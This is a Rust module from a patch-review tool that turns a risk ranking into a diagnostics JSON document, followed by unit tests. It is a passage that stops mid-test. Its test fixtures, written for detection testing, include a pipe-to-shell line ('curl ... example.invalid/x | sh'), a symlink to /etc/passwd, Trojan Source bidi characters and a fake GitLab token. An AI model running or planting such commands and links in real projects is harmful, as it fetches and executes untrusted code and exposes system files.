//! `deep-diff-forge.diagnostics.v0` (`docs/reference/diagnostics.md`): every label a ranking
//! raises, at the evidence row that locates it or at its file. Built from the ranking alone: it
//! holds no text of the change but each path, and says nothing `rank.v0` does not.

use crate::evidence::{MAX_EVIDENCE_PER_FILE, Side};
use crate::rank::RankedFile;
use crate::risk::RiskSignal;
use crate::vocabulary::{facts, remedy};
use deep_diff_forge_core::{InputSeal, is_unsafe_in_untrusted_text, json_escape, sha256_hex};
use std::collections::{BTreeMap, HashMap};
use std::fmt::Write as _;

/// One label of one ranked file, at an evidence row (`at`: side and line) or at the file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Diagnostic {
    pub key: String,
    pub code: String,
    pub signal: RiskSignal,
    pub path: String,
    pub at: Option<(Side, u32)>,
    /// How many earlier diagnostics have the same path, label, anchor, side and line.
    pub occurrence: u32,
    /// A reading of this version finds it (`current`); else `floor_only`.
    pub current: bool,
    /// The row's `test_likely`; written on `panic_path_added@line` only.
    pub test_likely: bool,
    /// Whether the admitted ranker raises this label in this file; only with [`Judge::Different`].
    pub judge_sees: Option<bool>,
    /// The case of a label whose repairs answer different cases (`cases`): for `hazardous_text`
    /// the kinds of hazard, for `diff_suppressed` the cause, in the vocabulary's order; `None`
    /// for every other label and when not known. The document lists only its repairs.
    pub case: Option<Vec<&'static str>>,
}

/// The ranker the stop's policy admits, when the producer knows it (`judge` in the document).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Judge {
    /// The producer runs no judge and knows no admitted ranker (the CLI, the daemon, MCP).
    Unknown,
    /// The admitted ranker, by SHA-256, is this engine.
    Same { ranker_sha256: String },
    /// Another ranker is admitted; `signals` is every (path, label) of its `signals[]` on the
    /// same input, which the producer has checked by its `input_sha256`.
    Different {
        ranker_sha256: String,
        signals: Vec<(String, String)>,
    },
    /// The policy refused every candidate ranker.
    NoneAdmitted,
}

/// A `deep-diff-forge.diagnostics.v0` document; `cut` is `{path, rows_kept}` in rank order.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Diagnostics {
    pub seal: InputSeal,
    pub judge: Judge,
    pub files: usize,
    pub cut: Vec<(String, usize)>,
    pub diagnostics: Vec<Diagnostic>,
}

/// `<label>@line` or `<label>@file`; an evidence row, or a line `hazardous_text` stands on,
/// locates a label at a line.
#[must_use]
pub fn code_of(signal: RiskSignal, line: bool) -> Option<String> {
    let anchor = if line { "line" } else { "file" };
    let located = matches!(signal, RiskSignal::Code(_) | RiskSignal::HazardousText);
    (!line || located).then(|| format!("{}@{anchor}", signal.label()))
}

/// The diagnostics of `ranked`, the ranking of the input `seal` seals, in its order: per file,
/// one `@line` per evidence row in the list's order, then one `hazardous_text@line` per line
/// that raises it while the file has fewer than [`MAX_EVIDENCE_PER_FILE`] located ones, then
/// one `@file` per label of `signals` none locates, in that order. `judge` is `unknown`.
#[must_use]
pub fn diagnostics(seal: &InputSeal, ranked: &[RankedFile]) -> Diagnostics {
    let (mut seen, mut out, mut cut) = (HashMap::new(), Vec::new(), Vec::new());
    for file in ranked {
        let row = |e: &crate::Evidence| (RiskSignal::Code(e.signal), Some((e.side, e.line)));
        let rows = file
            .evidence
            .iter()
            .map(|e| (row(e), e.read_now, e.test_likely, None));
        let room = MAX_EVIDENCE_PER_FILE.saturating_sub(file.evidence.len());
        let hazards = &file.hazard_lines[..file.hazard_lines.len().min(room)];
        if file.evidence_truncated
            || file.hazard_lines_cut
            || hazards.len() < file.hazard_lines.len()
        {
            cut.push((file.path.clone(), file.evidence.len() + hazards.len()));
        }
        let kept = hazards.len();
        let hazards = hazards
            .iter()
            .zip(&file.hazard_line_kinds)
            .map(|(&at, kinds)| {
                let case = case_of(RiskSignal::HazardousText, kinds);
                ((RiskSignal::HazardousText, Some(at)), true, false, case)
            });
        let located = |s: &RiskSignal| {
            file.evidence.iter().any(|e| row(e).0 == *s)
                || (*s == RiskSignal::HazardousText && kept > 0)
        };
        let floor =
            |s: RiskSignal| matches!(s, RiskSignal::Code(e) if file.floor_only.contains(&e));
        let unlocated = file.signals.iter().filter(|s| !located(s));
        let unlocated = unlocated.map(|&s| ((s, None), !floor(s), false, file_case(file, s)));
        for ((signal, at), current, test_likely, case) in rows.chain(hazards).chain(unlocated) {
            let seen = seen.entry((&file.path, signal.label(), at)).or_insert(0);
            let (occurrence, code) = (*seen, code_of(signal, at.is_some()).unwrap_or_default());
            *seen += 1;
            out.push(Diagnostic {
                key: key(&seal.input_sha256, &file.path, &code, at, occurrence),
                code,
                signal,
                path: file.path.clone(),
                at,
                occurrence,
                current,
                test_likely,
                judge_sees: None,
                case,
            });
        }
    }
    let (seal, files) = (seal.clone(), ranked.len());
    Diagnostics {
        seal,
        judge: Judge::Unknown,
        files,
        cut,
        diagnostics: out,
    }
}

/// The case of `signal` at its file: for `hazardous_text` every kind that raises it there, for
/// `diff_suppressed` the cause.
fn file_case(file: &RankedFile, signal: RiskSignal) -> Option<Vec<&'static str>> {
    match signal {
        RiskSignal::HazardousText => case_of(signal, &file.hazard_kinds),
        RiskSignal::DiffSuppressed => file.diff_suppressed.map(|cause| vec![cause.label()]),
        _ => None,
    }
}

/// `kinds` in the order the vocabulary names the cases of `signal` (a value it does not name
/// last); `None` when there is none.
fn case_of(signal: RiskSignal, kinds: &[&'static str]) -> Option<Vec<&'static str>> {
    let (names, mut case) = (remedy(signal).case_names(), kinds.to_vec());
    case.sort_by_key(|v| names.iter().position(|n| n == v).unwrap_or(names.len()));
    (!case.is_empty()).then_some(case)
}

/// SHA-256 of `ddf-diagnostic-v0`, input digest, path, label, anchor, side, line, occurrence,
/// NUL between each: no line text, no hunk address.
fn key(input: &str, path: &str, code: &str, at: Option<(Side, u32)>, occurrence: u32) -> String {
    let (label, anchor) = code.split_once('@').unwrap_or((code, ""));
    let (side, line) = at.map_or((String::new(), String::new()), |(s, n)| {
        (s.label().into(), n.to_string())
    });
    let text = format!(
        "ddf-diagnostic-v0\0{input}\0{path}\0{label}\0{anchor}\0{side}\0{line}\0{occurrence}"
    );
    sha256_hex(text.as_bytes())
}

/// [`json_escape`], and each bidi or invisible character as `\uXXXX` (a pair above U+FFFF), so
/// a path cannot reorder or hide text where it is shown.
fn safe(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    for c in json_escape(value).chars() {
        if is_unsafe_in_untrusted_text(c) {
            for unit in c.encode_utf16(&mut [0; 2]) {
                let _ = write!(out, "\\u{unit:04x}");
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// A JSON list or object body, one item a line, as `rank.v0` writes its entries.
fn block(items: &[String], open: char, close: char) -> String {
    if items.is_empty() {
        return format!("{open}{close}");
    }
    format!("{open}\n    {}\n  {close}", items.join(",\n    "))
}

impl Diagnostic {
    /// The diagnostic as the document writes it; the ids it names go into `texts` with their
    /// agent-facing text. A `floor_only` reading is for a person and names none; a known case
    /// names only the repairs and substitutes that answer it.
    fn to_json(&self, texts: &mut BTreeMap<&'static str, &'static str>) -> String {
        let remedy = remedy(self.signal);
        let (accept, not, reading, audience): (&[&str], &[_], _, _) = if self.current {
            (remedy.accept_ids, remedy.not_accepted, "current", "agent")
        } else {
            (&[], &[], "floor_only", "person")
        };
        let mut name = |id: &'static str, text: &'static str| {
            texts.insert(id, text);
            format!("\"{id}\"")
        };
        let answers = |id: &str| remedy.answers(id, self.case.as_deref());
        let repairs: Vec<String> = accept
            .iter()
            .zip(remedy.accept)
            .filter(|(id, _)| answers(id))
            .map(|(id, t)| name(id, t))
            .collect();
        let not: Vec<String> = not
            .iter()
            .filter(|n| answers(n.id))
            .filter_map(|n| Some(name(n.id, n.agent?)))
            .collect();
        let cases = self.case.as_ref().map_or_else(String::new, |case| {
            let case: Vec<String> = case.iter().map(|c| format!("\"{c}\"")).collect();
            format!(", \"cases\": [{}]", case.join(", "))
        });
        let (label, class) = (self.signal.label(), facts(self.signal).class.label());
        let (anchor, side, line) = self
            .at
            .map_or(("file", "null".into(), "null".into()), |(s, n)| {
                ("line", format!("\"{}\"", s.label()), n.to_string())
            });
        let mut likely = if self.code == "panic_path_added@line" {
            format!(", \"test_likely\": {}", self.test_likely)
        } else {
            String::new()
        };
        if let Some(sees) = self.judge_sees {
            let _ = write!(likely, ", \"judge_sees\": {sees}");
        }
        format!(
            "{{\"key\": \"{}\", \"code\": \"{}\", \"label\": \"{label}\", \"class\": \"{class}\", \"path\": {}, \"anchor\": \"{anchor}\", \"side\": {side}, \"line\": {line}, \"occurrence\": {}, \"reading\": \"{reading}\", \"audience\": \"{audience}\"{cases}, \"repairs\": [{}], \"not_accepted\": [{}]{likely}}}",
            self.key,
            self.code,
            safe(&self.path),
            self.occurrence,
            repairs.join(", "),
            not.join(", "),
        )
    }
}

impl Diagnostics {
    /// The document with `judge` as its producer knows it; with [`Judge::Different`] each
    /// diagnostic says whether that ranker raises its label in its file (`judge_sees`).
    #[must_use]
    pub fn judged(mut self, judge: Judge) -> Self {
        for d in &mut self.diagnostics {
            d.judge_sees = match &judge {
                Judge::Different { signals, .. } => Some(
                    signals
                        .iter()
                        .any(|(p, l)| *p == d.path && l == d.signal.label()),
                ),
                _ => None,
            };
        }
        self.judge = judge;
        self
    }

    /// The canonical bytes: schema first, members in the contract's order, two-space indent,
    /// one item a line.
    #[must_use]
    pub fn to_json(&self) -> String {
        let mut texts = BTreeMap::new();
        let items: Vec<String> = self
            .diagnostics
            .iter()
            .map(|d| d.to_json(&mut texts))
            .collect();
        let agent = self.diagnostics.iter().filter(|d| d.current).count();
        let cut = self
            .cut
            .iter()
            .map(|(p, n)| format!("{{\"path\": {}, \"rows_kept\": {n}}}", safe(p)));
        let texts: Vec<String> = texts
            .iter()
            .map(|(id, t)| format!("\"{id}\": {}", safe(t)))
            .collect();
        let (state, ranker) = match &self.judge {
            Judge::Unknown => ("unknown", None),
            Judge::Same { ranker_sha256 } => ("same", Some(ranker_sha256)),
            Judge::Different { ranker_sha256, .. } => ("different", Some(ranker_sha256)),
            Judge::NoneAdmitted => ("none_admitted", None),
        };
        let ranker = ranker.map_or_else(|| "null".into(), |r| safe(r));
        format!(
            "{{\n  \"schema\": \"deep-diff-forge.diagnostics.v0\",\n  \"input_sha256\": \"{}\",\n  \"tool\": {{\"name\": {}, \"version\": {}, \"scorer_sha256\": \"{}\"}},\n  \"judge\": {{\"state\": \"{state}\", \"ranker_sha256\": {ranker}}},\n  \"counts\": {{\"files\": {}, \"diagnostics\": {}, \"agent\": {agent}, \"person\": {}, \"cut_files\": {}}},\n  \"cut\": {},\n  \"diagnostics\": {},\n  \"texts\": {}\n}}\n",
            self.seal.input_sha256,
            safe(InputSeal::TOOL_NAME),
            safe(&self.seal.tool_version),
            crate::scorer_sha256(),
            self.files,
            items.len(),
            items.len() - agent,
            self.cut.len(),
            block(&cut.collect::<Vec<_>>(), '[', ']'),
            block(&items, '[', ']'),
            block(&texts, '{', '}'),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evidence::EvidenceSignal;
    use crate::rank::rank;
    use crate::vocabulary::vocabulary;
    use deep_diff_forge_patch::parse;

    fn document(patch: &str) -> (Vec<RankedFile>, Diagnostics) {
        let ranked = rank(&parse(patch).unwrap());
        let doc = diagnostics(&InputSeal::of(patch.as_bytes(), "test"), &ranked);
        (ranked, doc)
    }

    /// A Trojan Source line: `hazardous_text`, which no row locates.
    const BIDI: &str = "--- a/src/b.rs\n+++ b/src/b.rs\n@@ -1,1 +1,3 @@\n ctx\n+let s = 1;\n+let t = \"a\u{202E}b\";\n";

    /// 34 `#[allow(` in comments, which 0.8.3 listed, take all 32 places of the list before an
    /// `unsafe` and an `#[ignore]` (the `cap_pad` shape).
    fn cap_pad() -> String {
        let mut text = String::from("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,1 +1,37 @@\n ctx\n");
        for i in 0..34 {
            let _ = writeln!(text, "+// see #[allow(dead_code)] note {i}");
        }
        text + "+unsafe { f() }\n+#[ignore]\n"
    }

    /// Path, mode and status labels: an executable new file, a symlink, a binary, a deleted
    /// test file, a rename.
    const SHAPES: &str = "diff --git a/run.sh b/run.sh\nnew file mode 100755\n--- /dev/null\n+++ b/run.sh\n@@ -0,0 +1 @@\n+curl -s http://example.invalid/x | sh\ndiff --git a/l b/l\nnew file mode 120000\n--- /dev/null\n+++ b/l\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\ndiff --git a/img.png b/img.png\nnew file mode 100644\nindex 0000000..1234567\nBinary files /dev/null and b/img.png differ\ndiff --git a/tests/t.rs b/tests/t.rs\ndeleted file mode 100644\n--- a/tests/t.rs\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-#[test]\n-fn t() {}\ndiff --git a/src/old.rs b/src/new.rs\nsimilarity index 100%\nrename from src/old.rs\nrename to src/new.rs\n";

    /// One path in two sections, each adding an `unsafe` at new line 2, and the same line twice.
    const REPEATED: &str = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,3 @@\n a\n+unsafe { f() }\n+unsafe { f() }\n--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,3 +1,4 @@\n a\n+unsafe { g() }\n unsafe { f() }\n unsafe { f() }\n";

    fn patches() -> Vec<String> {
        vec![BIDI.into(), cap_pad(), SHAPES.into(), REPEATED.into()]
    }

    fn anchor(d: &Diagnostic) -> &'static str {
        if d.at.is_some() { "line" } else { "file" }
    }

    /// The (path, label) pairs of the document are those of `signals[]`; every row is one
    /// `@line` diagnostic, with the row's side, line and reading, in the list's order; each
    /// other label of a file is one `@file` diagnostic after its rows.
    #[test]
    fn diagnostics_cover_every_signal_and_every_row() {
        for patch in patches() {
            let (ranked, doc) = document(&patch);
            let mut rest = doc.diagnostics.iter();
            for file in &ranked {
                for signal in &file.signals {
                    assert!(
                        doc.diagnostics
                            .iter()
                            .any(|d| d.path == file.path && d.signal == *signal),
                        "{} of {} has no diagnostic",
                        signal.label(),
                        file.path
                    );
                }
                for row in &file.evidence {
                    let d = rest.next().expect("a diagnostic for every row");
                    let found = (&d.path, d.signal, d.at, d.current, anchor(d));
                    let at = Some((row.side, row.line));
                    let want = (
                        &file.path,
                        RiskSignal::Code(row.signal),
                        at,
                        row.read_now,
                        "line",
                    );
                    assert_eq!(found, want, "{patch}");
                }
                let room = MAX_EVIDENCE_PER_FILE - file.evidence.len();
                for &at in file.hazard_lines.iter().take(room) {
                    let d = rest.next().expect("a diagnostic for every hazardous line");
                    let want = (&file.path, RiskSignal::HazardousText, Some(at), true);
                    assert_eq!((&d.path, d.signal, d.at, d.current), want, "{patch}");
                }
                let located = |s: &RiskSignal| {
                    file.evidence
                        .iter()
                        .any(|e| RiskSignal::Code(e.signal) == *s)
                        || (*s == RiskSignal::HazardousText
                            && room > 0
                            && !file.hazard_lines.is_empty())
                };
                for signal in file.signals.iter().filter(|s| !located(s)) {
                    let d = rest
                        .next()
                        .unwrap_or_else(|| panic!("{}: no @file", signal.label()));
                    assert_eq!(
                        (&d.path, d.signal, d.at),
                        (&file.path, *signal, None),
                        "{patch}"
                    );
                }
            }
            assert_eq!(rest.next(), None, "a diagnostic of no signal: {patch}");
            assert_eq!(doc.files, ranked.len());
        }
        let (ranked, doc) = document(BIDI);
        assert_eq!(ranked[0].evidence, []);
        let codes: Vec<&str> = doc.diagnostics.iter().map(|d| d.code.as_str()).collect();
        assert_eq!(codes, ["hazardous_text@line"]);
        let (ranked, doc) = document(&cap_pad());
        assert!(
            ranked[0]
                .evidence
                .iter()
                .all(|e| e.signal == EvidenceSignal::CheckSuppressed)
        );
        let codes: Vec<&str> = doc.diagnostics.iter().map(|d| d.code.as_str()).collect();
        for code in ["unsafe_added@file", "test_skipped@file"] {
            assert!(codes.contains(&code), "{code} of the cut file: {codes:?}");
        }
        assert_eq!(doc.cut, [("src/a.rs".to_owned(), 32)]);
        assert!(
            doc.to_json()
                .contains("\"cut\": [\n    {\"path\": \"src/a.rs\", \"rows_kept\": 32}\n  ]")
        );
    }

    /// A code is the label and the diagnostic's own anchor, in the document as in the type, and
    /// every code is in the pinned table.
    #[test]
    fn every_code_is_its_label_at_its_anchor() {
        let pinned = codes_v0();
        for patch in patches() {
            let doc = document(&patch).1;
            let json = doc.to_json();
            for d in &doc.diagnostics {
                let code = format!("{}@{}", d.signal.label(), anchor(d));
                assert_eq!(d.code, code, "{patch}");
                assert!(pinned.contains(&code), "{code} is not pinned");
                let written = json.lines().find(|l| l.contains(&d.key)).unwrap();
                let label = d.signal.label();
                for member in [
                    format!("\"code\": \"{code}\", \"label\": \"{label}\""),
                    format!("\"anchor\": \"{}\"", anchor(d)),
                ] {
                    assert!(written.contains(&member), "{member} not in {written}");
                }
                assert!(
                    d.at.is_none()
                        || matches!(d.signal, RiskSignal::Code(_) | RiskSignal::HazardousText),
                    "{code}"
                );
            }
        }
    }

    fn codes_v0() -> Vec<String> {
        let path = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../fixtures/diagnostics/codes.v0.txt"
        );
        std::fs::read_to_string(path)
            .unwrap()
            .lines()
            .map(str::to_owned)
            .collect()
    }

    /// The codes the builder can make are the pinned table, every one of them.
    #[test]
    fn the_code_table_matches_the_builder() {
        let mut made: Vec<String> = vocabulary()
            .iter()
            .flat_map(|f| [code_of(f.signal, true), code_of(f.signal, false)])
            .flatten()
            .collect();
        let mut pinned = codes_v0();
        made.sort();
        pinned.sort();
        assert_eq!(made, pinned);
    }

    /// Every key is the SHA-256 of the members it is defined by, recomputed here, and the keys
    /// of a document differ: the same line in two sections of one path, and two equal lines.
    #[test]
    fn every_key_is_recomputed_from_its_members() {
        for patch in patches() {
            let doc = document(&patch).1;
            let json = doc.to_json();
            let mut keys = Vec::new();
            for d in &doc.diagnostics {
                let (side, line) = d.at.map_or((String::new(), String::new()), |(s, n)| {
                    (s.label().into(), n.to_string())
                });
                let fields = format!(
                    "ddf-diagnostic-v0\0{}\0{}\0{}\0{}\0{side}\0{line}\0{}",
                    doc.seal.input_sha256,
                    d.path,
                    d.signal.label(),
                    anchor(d),
                    d.occurrence
                );
                assert_eq!(d.key, sha256_hex(fields.as_bytes()), "{patch}");
                assert!(json.contains(&format!("{{\"key\": \"{}\"", d.key)));
                keys.push(d.key.clone());
            }
            keys.sort();
            keys.dedup();
            assert_eq!(keys.len(), doc.diagnostics.len(), "{patch}");
        }
    }

    /// The same `unsafe` line twice in one file, and the same line in two sections of a path:
    /// distinct keys, the second section's by its occurrence.
    #[test]
    fn identical_lines_in_one_file_get_distinct_keys() {
        let doc = document(REPEATED).1;
        let at_two: Vec<&Diagnostic> = doc
            .diagnostics
            .iter()
            .filter(|d| d.code == "unsafe_added@line" && d.at == Some((Side::New, 2)))
            .collect();
        assert_eq!(
            at_two.iter().map(|d| d.occurrence).collect::<Vec<_>>(),
            [0, 1]
        );
        assert_ne!(at_two[0].key, at_two[1].key);
        let lines: Vec<_> = doc.diagnostics.iter().filter(|d| d.at.is_some()).collect();
        assert!(lines.len() >= 3, "{lines:?}");
    }

    /// No text of a changed line reaches the document, and no hash of one: every 64-digit hex
    /// value in it is the input's, the scorer's or a key the document recomputes.
    #[test]
    fn the_canary_and_the_secret_are_never_copied() {
        let token = ["gl", "pat-", "AbCdEfGhIj", "KlMnOpQrSt"].concat();
        let canary = ["canary", "-7f3a91"].concat();
        let patch = format!(
            "--- a/src/k.rs\n+++ b/src/k.rs\n@@ -1,1 +1,3 @@ fn {canary}()\n ctx\n+let t = \"{token}\"; // {canary}\n+unsafe {{ {canary}() }}\n"
        );
        let doc = document(&patch).1;
        let json = doc.to_json();
        let codes: Vec<&str> = doc.diagnostics.iter().map(|d| d.code.as_str()).collect();
        assert!(codes.contains(&"secret_like@line"), "{codes:?}");
        for text in [&token, &canary, &"glpat".to_owned()] {
            assert!(!json.contains(text.as_str()), "{text} copied:\n{json}");
        }
        let known: Vec<&str> = [doc.seal.input_sha256.as_str(), crate::scorer_sha256()]
            .into_iter()
            .chain(doc.diagnostics.iter().map(|d| d.key.as_str()))
            .collect();
        let bytes = json.as_bytes();
        for (at, _) in json.char_indices() {
            let run = bytes[at..]
                .iter()
                .take_while(|b| b.is_ascii_hexdigit())
                .count();
            if run >= 64 && (at == 0 || !bytes[at - 1].is_ascii_hexdigit()) {
                let hex = &json[at..at + run];
                assert!(
                    known.contains(&hex),
                    "a 64-digit hex value the document cannot recompute: {hex}"
                );
            }
        }
    }

    /// The path is the only text of the change, and it cannot reorder or hide text: bidi and
    /// invisible characters are written as `\uXXXX`, a pair above U+FFFF.
    #[test]
    fn a_path_is_written_display_safe() {
        let name = "src/a\u{202E}b\u{200B}c\u{E0041}.rs";
        let patch = format!("--- a/{name}\n+++ b/{name}\n@@ -1,1 +1,2 @@\n a\n+unsafe {{ f() }}\n");
        let doc = document(&patch).1;
        assert_eq!(doc.diagnostics[0].path, name);
        let json = doc.to_json();
        assert!(
            json.contains("\"path\": \"src/a\\u202eb\\u200bc\\udb40\\udc41.rs\""),
            "{json}"
        );
        assert!(!json.contains('\u{202E}') && !json.contains('\u{200B}'));
    }

    /// The reading of a file's items in `patch` and of its diagnostics: (label, line, reading).
    fn readings(patch: &str) -> Vec<(&'static str, u32, bool, bool)> {
        let file = parse(patch).unwrap().remove(0);
        let doc = document(patch).1;
        for d in doc.diagnostics.iter().filter(|d| d.at.is_some()) {
            let reading = if d.current {
                "\"reading\": \"current\", \"audience\": \"agent\""
            } else {
                "\"reading\": \"floor_only\", \"audience\": \"person\", \"repairs\": [], \"not_accepted\": []"
            };
            let json = doc.to_json();
            let written = json.lines().find(|l| l.contains(&d.key)).unwrap();
            assert!(written.contains(reading), "{written}");
        }
        crate::evidence::file_evidence(&file)
            .iter()
            .map(|e| (e.signal.label(), e.line, e.released, e.read_now))
            .collect()
    }

    /// Outside Rust the hunk read alone is a current reading, though it is also how 0.8.3 read it
    /// (`released`): by reader, not by the mark.
    #[test]
    fn a_python_spawn_reads_current() {
        let patch = "--- a/run.py\n+++ b/run.py\n@@ -1,1 +1,2 @@\n import subprocess\n+subprocess.run([\"sh\"])\n";
        assert_eq!(readings(patch), [("process_spawn", 2, true, true)]);
    }

    #[test]
    fn rust_unsafe_in_code_reads_current() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n fn a() {}\n+fn b() { unsafe { c() } }\n";
        assert_eq!(readings(patch), [("unsafe_added", 2, true, true)]);
    }

    /// The readers of this version also read `#[allow(` in a Rust comment (the rule on the raw
    /// line, `#` then `[allow(`), so it is current, not only 0.8.3's.
    #[test]
    fn a_rust_allow_in_a_comment_reads_current() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n fn a() {}\n+// see #[allow(dead_code)]\n";
        assert_eq!(readings(patch), [("check_suppressed", 2, true, true)]);
    }

    /// An `unsafe` in a raw string over lines, which the scanner of release 0.8.3 took for code:
    /// only the reading of that release finds it (shape of the corpus's
    /// `hardening-review-20261118/deep/C/patches/260.patch`).
    #[test]
    fn an_unsafe_in_a_rust_raw_string_reads_floor_only() {
        let patch = "--- a/src/app.rs\n+++ b/src/app.rs\n@@ -1,2 +1,5 @@\n // ctx\n+    let s = r#\"\n+    unsafe { f() }\n+    \"#;\n // ctx\n";
        assert_eq!(readings(patch), [("unsafe_added", 3, true, false)]);
        let (ranked, doc) = document(patch);
        assert_eq!(ranked[0].floor_only, [EvidenceSignal::UnsafeAdded]);
        assert_eq!(doc.diagnostics[0].code, "unsafe_added@line");
        assert!(!doc.diagnostics[0].current);
        assert!(doc.to_json().contains("\"counts\": {\"files\": 1, \"diagnostics\": 1, \"agent\": 0, \"person\": 1, \"cut_files\": 0}"));
    }

    /// `hazardous_text` from a line is located at that line (`core::text_hazards`, as the
    /// score reads it); one from the path alone, which has no line, is at its file. The text of
    /// the line never reaches the document.
    #[test]
    fn hazardous_text_is_located_per_line_and_its_text_is_never_copied() {
        let canary = ["canary", "-c0ffee"].concat();
        let patch = format!(
            "--- a/src/h.rs\n+++ b/src/h.rs\n@@ -1,2 +1,2 @@\n ctx\n-let a = \"{canary}\u{200B}\";\n+let a = \"{canary}\u{202E}\";\n"
        );
        let doc = document(&patch).1;
        let found: Vec<_> = doc
            .diagnostics
            .iter()
            .map(|d| (d.code.as_str(), d.at))
            .collect();
        let want = [
            ("hazardous_text@line", Some((Side::Old, 2))),
            ("hazardous_text@line", Some((Side::New, 2))),
        ];
        assert_eq!(found, want);
        let json = doc.to_json();
        assert!(json.contains("\"side\": \"old\", \"line\": 2"), "{json}");
        assert!(
            !json.contains(&canary) && !json.contains('\u{202E}'),
            "{json}"
        );
        let name = "src/a\u{202E}b.rs";
        let doc = document(&format!(
            "--- a/{name}\n+++ b/{name}\n@@ -1,1 +1,2 @@\n a\n+b\n"
        ))
        .1;
        let found: Vec<_> = doc
            .diagnostics
            .iter()
            .map(|d| (d.code.as_str(), d.at))
            .collect();
        assert_eq!(found, [("hazardous_text@file", None)]);
    }

    /// `n` added lines that each carry a bidi control, after `rows` lines of `unsafe`.
    fn hazards_after_rows(rows: usize, n: usize) -> String {
        let mut text = format!(
            "--- a/src/z.rs\n+++ b/src/z.rs\n@@ -0,0 +1,{} @@\n",
            rows + n
        );
        for i in 0..rows {
            let _ = writeln!(text, "+unsafe {{ f{i}() }}");
        }
        for i in 0..n {
            let _ = writeln!(text, "+let s{i} = \"\u{202E}\";");
        }
        text
    }

    /// A file keeps at most 32 located diagnostics and the ranking at most 32 hazardous lines:
    /// past that the file is in `cut` with the number kept. While a `hazardous_text@line`
    /// stands the label is located; when the rows took every place, it is at its file.
    #[test]
    fn hazardous_lines_over_the_cap_are_cut_and_said() {
        let (ranked, doc) = document(&hazards_after_rows(0, 40));
        assert_eq!(
            (ranked[0].hazard_lines.len(), ranked[0].hazard_lines_cut),
            (32, true)
        );
        let lines = |doc: &Diagnostics, code: &str| {
            doc.diagnostics.iter().filter(|d| d.code == code).count()
        };
        assert_eq!(lines(&doc, "hazardous_text@line"), 32);
        assert_eq!(lines(&doc, "hazardous_text@file"), 0);
        assert_eq!(doc.cut, [("src/z.rs".to_owned(), 32)]);
        let (ranked, doc) = document(&hazards_after_rows(30, 5));
        assert_eq!(
            (ranked[0].evidence.len(), ranked[0].evidence_truncated),
            (30, false)
        );
        assert_eq!(lines(&doc, "hazardous_text@line"), 2);
        assert_eq!(doc.cut, [("src/z.rs".to_owned(), 32)]);
        let (ranked, doc) = document(&hazards_after_rows(33, 1));
        assert_eq!(ranked[0].evidence.len(), 32);
        assert_eq!(lines(&doc, "hazardous_text@line"), 0);
        assert_eq!(lines(&doc, "hazardous_text@file"), 1);
        assert_eq!(doc.cut, [("src/z.rs".to_owned(), 32)]);
        let doc = document(&hazards_after_rows(31, 1)).1;
        assert_eq!((lines(&doc, "hazardous_text@line"), doc.cut.len()), (1, 0));
    }

    /// `judge` says what the producer knows; with another admitted ranker each diagnostic says
    /// whether that ranker raises its label in its file.
    #[test]
    fn the_judge_is_written_as_the_producer_knows_it() {
        let doc = document(&hazards_after_rows(1, 1)).1;
        let judge = |doc: &Diagnostics| {
            let json = doc.to_json();
            json.lines()
                .find(|l| l.contains("\"judge\""))
                .unwrap()
                .to_owned()
        };
        let unknown = "  \"judge\": {\"state\": \"unknown\", \"ranker_sha256\": null},";
        assert_eq!(judge(&doc), unknown);
        assert!(!doc.to_json().contains("judge_sees"));
        let sha = "ab".repeat(32);
        let same = doc.clone().judged(Judge::Same {
            ranker_sha256: sha.clone(),
        });
        let want = format!("  \"judge\": {{\"state\": \"same\", \"ranker_sha256\": \"{sha}\"}},");
        assert_eq!(judge(&same), want);
        assert!(!same.to_json().contains("judge_sees"));
        let none = doc.clone().judged(Judge::NoneAdmitted);
        assert!(judge(&none).contains("\"none_admitted\", \"ranker_sha256\": null"));
        let signals = vec![("src/z.rs".to_owned(), "unsafe_added".to_owned())];
        let other = doc.judged(Judge::Different {
            ranker_sha256: sha,
            signals,
        });
        assert!(judge(&other).contains("\"state\": \"different\""));
        let json = other.to_json();
        for d in &other.diagnostics {
            let sees = d.code.starts_with("unsafe_added");
            assert_eq!(d.judge_sees, Some(sees), "{}", d.code);
            let written = json.lines().find(|l| l.contains(&d.key)).unwrap();
            assert!(
                written.ends_with(&format!(", \"judge_sees\": {sees}}},"))
                    || written.ends_with(&format!(", \"judge_sees\": {sees}}}")),
                "{written}"
            );
        }
    }

    /// The written `cases` and `repairs` of each diagnostic of `doc` with `code`, in order.
    fn repairs_of(doc: &Diagnostics, code: &str) -> Vec<(Option<Vec<&'static str>>, String)> {
        let json = doc.to_json();
        doc.diagnostics
            .iter()
            .filter(|d| d.code == code)
            .map(|d| {
                let written = json.lines().find(|l| l.contains(&d.key)).unwrap();
                let at = written.find("\"repairs\": [").unwrap() + 12;
                let repairs = written[at..].split(']').next().unwrap().replace('"', "");
                let cases = written.find("\"cases\": [").map(|at| {
                    let list = written[at + 10..].split(']').next().unwrap();
                    assert_eq!(
                        d.case.as_ref().map(|c| c
                            .iter()
                            .map(|v| format!("\"{v}\""))
                            .collect::<Vec<_>>()
                            .join(", ")),
                        Some(list.to_owned()),
                        "{written}"
                    );
                });
                assert_eq!(cases.is_some(), d.case.is_some(), "{written}");
                (d.case.clone(), repairs)
            })
            .collect()
    }

    /// F1.a3: a line with a bidi control is told to remove the characters, not to fix a path;
    /// each kind of the line is its case, and the text names no other repair.
    #[test]
    fn a_hazardous_line_lists_only_the_character_repair() {
        let doc = document(BIDI).1;
        let want = (Some(vec!["bidi_control"]), "hazardous_text:a1".to_owned());
        assert_eq!(repairs_of(&doc, "hazardous_text@line"), [want]);
        let json = doc.to_json();
        assert!(!json.contains("hazardous_text:a2"), "{json}");
        let both =
